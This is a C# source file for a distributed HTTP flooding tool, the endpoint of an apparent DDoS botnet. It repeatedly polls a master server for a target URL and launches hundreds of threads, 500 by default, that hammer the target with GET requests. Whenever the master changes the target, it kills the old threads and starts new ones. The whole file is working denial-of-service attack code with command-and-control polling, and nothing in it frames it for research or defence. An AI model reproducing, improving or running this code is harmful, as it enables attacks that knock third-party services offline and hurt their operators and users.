using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Json;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using HttpDDoS.Shared;
using CommandLine;

namespace HttpDDoS.Endpoint
{
    class Program
    {

        public static void Main(string[] args)
        {
            Parser.Default.ParseArguments<Options>(args)
                .WithParsed(Run);
        }

        public static void Run(Options options)
        {
            CancellationTokenSource tokenSrc = new();
            var http = new HttpClient();

            List<Thread> threads = new();

            Status currStatus = null;

            while (true)
            {
                Console.WriteLine("MAIN: Fetching Info From Master Server...");
                var newStatusTask = http.GetFromJsonAsync<Status>(options.Url);
                newStatusTask.Wait();
                var newStatus = newStatusTask.Result;
                if (currStatus is null || newStatus.Url != currStatus.Url)
                {
                    currStatus = newStatus;
                    Console.WriteLine("MAIN: Got updated info! {0}", newStatus.Url);
                    Console.WriteLine("MAIN: Killing old threads..");
                    tokenSrc.Cancel();
                    tokenSrc = new();
                    Console.WriteLine("MAIN: Creating new threads..");
                    threads = Enumerable.Range(0, options.NumberOfThreads)
                        .Select(_ => new Thread(() => Attack(currStatus, tokenSrc.Token)))
                        .ToList();
                    Console.WriteLine("MAIN: Starting new threads..");
                    threads.ForEach(t => t.Start());
                    Console.WriteLine("MAIN: Started.");
                }
                Thread.Sleep(options.RefreshInterval * 1000);
            }
        }


        public static void Attack(Status status, CancellationToken token)
        {
            var http = new HttpClient();
            int count = 0;
            while (!token.IsCancellationRequested)
            {
                try
                {
                    _ = http.GetAsync(status.Url, token).Result;
                }
                catch (Exception ex)
                {
                    if (!token.IsCancellationRequested) Console.WriteLine(ex);
                }
                count++;
            }
            Console.WriteLine("SUB: Exited #{0} after {1} requests", Thread.CurrentThread.ManagedThreadId, count);
        }

        public class Options
        {
            const int DefaultNumberOfThreads = 500;
            const int DefaultRefreshInterval = 10;

            [Option('r', "refresh", Required = false, Default = DefaultRefreshInterval, HelpText = "Time to wait (in seconds) between each refresh of instructions.")]
            public int RefreshInterval { get; set; }
            [Option('u', "url", Required = true, HelpText = "The URL of the master service status endpoint.")]
            public string Url { get; set; }
            [Option('t', "threads", Required = false, Default = DefaultNumberOfThreads, HelpText = "Number of threads running in the background, consuming the target.")]
            public int NumberOfThreads { get; set; }
        }
    }
}
